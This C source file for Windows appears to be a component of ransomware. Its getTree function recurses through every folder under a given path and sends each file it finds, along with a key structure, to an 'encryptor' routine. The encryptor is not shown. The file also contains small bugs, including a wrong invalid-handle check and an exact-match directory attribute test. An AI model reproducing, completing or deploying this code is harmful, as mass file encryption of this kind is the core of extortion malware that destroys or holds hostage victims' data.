#include <stdio.h>
#include <Windows.h>
#include "keyDef.h"

int getTree(char* path, key keyStruct) {

	// Add "\*" to path 
	int targetPathLen = (strlen(path) + 3);
	char* targetPath = (char*)malloc(targetPathLen);
	strcpy_s(targetPath, targetPathLen, path);
	strcat_s(targetPath, targetPathLen, "\\*");

	// Initialize search handle and file data struct
	HANDLE hSearch;
	WIN32_FIND_DATA fileData;
	hSearch = FindFirstFileA(targetPath, &fileData);
	if (hSearch == NULL) {
		printf("\n Error getting first file - %lu", GetLastError());
	}

	// Iterate through files and directories in path
	do {
		if (strcmp(fileData.cFileName, ".") != 0 && strcmp(fileData.cFileName, "..") != 0) {
			
			// Check if file is dir
			if (fileData.dwFileAttributes == 16) {
				printf("\nFound folder %s\\%s\n", path, fileData.cFileName);

				// Making new directory path for recursion
				int foundDirLen = (strlen(path) + strlen(fileData.cFileName) + 2);
				char* foundDir = (char*)malloc(foundDirLen);
				strcpy_s(foundDir, foundDirLen, path);
				strcat_s(foundDir, foundDirLen, "\\");
				strcat_s(foundDir, foundDirLen, fileData.cFileName);
				
				// Recursion
				getTree(foundDir, keyStruct);
				free(foundDir);
			} else {

				// Making file path for encryptor
				int foundFileLen = (strlen(path) + strlen(fileData.cFileName) + 2);
				char* foundFile = (char*)malloc(foundFileLen);
				strcpy_s(foundFile, foundFileLen, path);
				strcat_s(foundFile, foundFileLen, "\\");
				strcat_s(foundFile, foundFileLen, fileData.cFileName);
				
				// Send found file path to encryptor
				encryptor(foundFile, keyStruct);
			}
		}
	} while (FindNextFileA(hSearch, &fileData));
	
	// Cleaning up once recursion is done
	FindClose(hSearch);
	free(targetPath);

	return 0;
}

